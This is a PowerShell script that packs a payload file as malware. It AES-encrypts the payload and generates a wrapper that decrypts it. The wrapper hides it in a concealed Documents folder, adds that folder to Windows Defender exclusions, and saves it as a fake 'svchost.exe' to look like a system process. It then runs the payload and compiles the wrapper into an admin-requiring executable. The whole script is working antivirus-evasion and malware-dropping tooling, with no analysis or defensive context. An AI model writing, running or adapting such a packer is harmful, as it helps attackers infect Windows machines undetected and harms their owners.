# Ask the user for the directory
$payloadFilepath = Read-Host "Enter the FULL file path of the payload file"

Write-Host "You entered: $payloadFilepath"

# Read payload into memory
$bytesArray = Get-Content -Path $payloadFilepath -Encoding Byte

# Encrypt the payload
$aes = New-Object System.Security.Cryptography.AesManaged # Create an AES object
$encryptedBytes = $aes.CreateEncryptor().TransformFinalBlock($bytesArray, 0, $bytesArray.Length) # Encrypt the data
$key = $aes.Key # Store the key
$iv = $aes.IV # Store the IV

# Convert the payload, key, and IV into a base64 string
$base64EncryptedData = [Convert]::ToBase64String($encryptedBytes)
$base64Key = [Convert]::ToBase64String($key)
$base64IV = [Convert]::ToBase64String($iv)

# Create the PowerShell script for the packed malware
$content = @"

# Check if the script is running as an Administrator

`$data = '$base64EncryptedData'
`$key = '$base64Key'
`$iv = '$base64IV'

# Create AES object
`$aesDecrypt = New-Object System.Security.Cryptography.AesManaged

# Convert from base64 string back to bytes array
`$encryptedBytes = [Convert]::FromBase64String(`$data)
`$aesDecrypt.Key = [Convert]::FromBase64String(`$key)
`$aesDecrypt.IV = [Convert]::FromBase64String(`$iv)

# Decrypt the data
`$decryptedBytes = `$aesDecrypt.CreateDecryptor().TransformFinalBlock(`$encryptedBytes, 0, `$encryptedBytes.Length)

# Create a new folder called ".config" in Documents
`$documentsPath = [Environment]::GetFolderPath([Environment+SpecialFolder]::MyDocuments)
`$execDir = `$documentsPath + "\.__config__"
New-Item -Path `$execDir -ItemType Directory > `$null
Start-Sleep 2

# Make the folder hidden
Set-ItemProperty -Path `$execDir -Name attributes -Value ([System.IO.FileAttributes]::Hidden)
Start-Sleep 2

# Mkae the .config folder excluded from Windows Security
Add-MpPreference -ExclusionPath `$execDir
Start-Sleep 3

# Save payload to .config folder
`$execPath = `$execDir + "\svchost.exe"
[System.IO.File]::WriteAllBytes(`$execPath, `$decryptedBytes)

# Run the payload
& `$execPath

# Keep the shell up (otherwise comment this out)
# Read-Host -Prompt "Press Enter to continue"
"@

# Save the script to disk
$savePath = ".\packed.ps1"
Set-Content -Path $savePath -Value $content

# Convert the script into an executable
Invoke-PS2EXE -inputFile $savePath -outputFile ".\packed.exe" -requireAdmin

# Delete the script file
Remove-Item -Path $savePath


